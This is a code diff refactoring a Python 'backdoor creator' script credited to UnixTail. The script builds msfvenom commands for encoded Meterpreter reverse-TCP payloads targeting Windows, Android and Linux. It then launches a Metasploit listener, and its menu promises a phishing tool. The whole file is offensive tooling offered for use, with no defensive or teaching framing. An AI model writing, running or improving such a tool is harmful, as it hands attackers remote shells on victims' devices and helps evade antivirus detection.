@@ -1,6 +1,6 @@
 # created by unixtail09 
 import subprocess
-import time 
+import time as t
 import os
 import random
 import sys
@@ -10,24 +10,7 @@ import threading
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def matrix_rain(text="Created by UnixTail", duration=5):
-    width = os.get_terminal_size().columns
-    end_time = time.time() + duration
-
-    while time.time() < end_time:
-        line = ""
-        for _ in range(width // len(text)):
-            if random.random() > 0.8:
-                line += text + " "
-            else:
-                line += " " * len(text) + " "
-        print(line[:width])
-        time.sleep(0.05)
-
 def run_intro():
-    clear()
-    matrix_rain("Created by UnixTail", duration=3)
-    time.sleep(1)
     clear()
     print("""
 ██████╗░██╗░░░██╗███╗░░██╗██╗██╗░░██╗████████╗░█████╗░██╗██╗░░░░░
@@ -38,13 +21,13 @@ def run_intro():
 ╚═════╝░░╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚══════╝
                 💻 Coded by UnixTail 💻
     """)
-    time.sleep(2)
+    t.sleep(2)
 
 def loading_animation(msg="Creating Payload"):
-    done = False
+    done_flag = [False]
     def animate():
         for c in itertools.cycle(['|', '/', '-', '\\']):
-            if done:
+            if done_flag[0]:
                 break
             sys.stdout.write(f'\r{msg}... {c}')
             sys.stdout.flush()
@@ -52,7 +35,7 @@ def loading_animation(msg="Creating Payload"):
         sys.stdout.write('\r✅ Payload Created Successfully!     \n')
     t1 = threading.Thread(target=animate)
     t1.start()
-    return t1, lambda: setattr(sys.modules[__name__], 'done', True)
+    return t1, lambda: done_flag.__setitem__(0, True)
 
 def create_listener(ip, port):
     rc_content = f"""
@@ -78,64 +61,56 @@ def run_outro():
          🛠️ UnixTail09 🛠️
 """)
 
-# Run intro
-run_intro()
+def main():
+    run_intro()
+    print("[*] OPENING...... [*]")
+    t.sleep(2)
+    clear()
 
-print("[*] OPENING...... [*]")
-time.sleep(2)
+    print("""
+    [1] Create a Backdoor
+    [2] Phishing Tool (under development)
+    """)
+    a = input("\nChoose an option >>> ")
+    clear()
 
-print("\n[*] 1. Create a Backdoor  [*]\n")
-print ("\n [*] 2. phishing tool (under devolpment not finished)")
-a = int(input("Input Your Option --->> "))
+    if a == "1":
+        print("1. Backdoor for Windows")
+        print("2. Backdoor for Android")
+        print("3. Backdoor for Linux (x86 only)")
 
-if a == 1:
-    print("1. Backdoor for Windows")
-    print("2. Backdoor for Android")
-    print("3. Backdoor for Linux (x86 only)")
+        backdoor = input("\nChoose a platform >>> ")
+        clear()
 
-    backdoor = int(input("Input Your Option ---->> "))
-    
-    if backdoor == 1:
         ip = input("Input LHOST/IP: ")
         port = input("Input Port: ")
-        name = input("Enter filename (.exe): ")
+        name = input("Enter output filename: ")
 
-        cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 5 -f exe > {name}"
-        t_anim, stop_anim = loading_animation("Creating Windows Payload")
+        if backdoor == "1":
+            cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 5 -f exe > {name}"
+            t_anim, stop_anim = loading_animation("Creating Windows Payload")
+        elif backdoor == "2":
+            cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f apk > {name}"
+            t_anim, stop_anim = loading_animation("Creating Android Payload")
+        elif backdoor == "3":
+            cmd = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 5 -f elf > {name}"
+            t_anim, stop_anim = loading_animation("Creating Linux Payload")
+        else:
+            print("Invalid option selected!")
+            return
+
         subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
         stop_anim()
         t_anim.join()
         create_listener(ip, port)
-        print("Listener Started in Background!")
+        print("\n[*] Listener started in background!")
 
-    elif backdoor == 2:
-        ip = input("Input LHOST/IP: ")
-        port = input("Input Port: ")
-        name = input("Enter APK name (.apk): ")
-
-        cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f apk > {name}"
-        t_anim, stop_anim = loading_animation("Creating Android Payload")
-        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
-        stop_anim()
-        t_anim.join()
-        create_listener(ip, port)
-        print("Listener Started in Background!")
-
-    elif backdoor == 3:
-        ip = input("Input LHOST/IP: ")
-        port = input("Input Port: ")
-        name = input("Enter ELF filename (.elf): ")
-
-        cmd = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 5 -f elf > {name}"
-        t_anim, stop_anim = loading_animation("Creating Linux Payload")
-        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
-        stop_anim()
-        t_anim.join()
-        create_listener(ip, port)
-        print("Listener Started in Background!")
-
+    elif a == "2":
+        print("Phishing tool is still under development. Coming soon!")
     else:
-        print("WRONG INPUT MATE !!!!")
+        print("Invalid main menu option!")
 
-# Running the function for outro 
-run_outro()
+    run_outro()
+
+if __name__ == "__main__":
+    main()
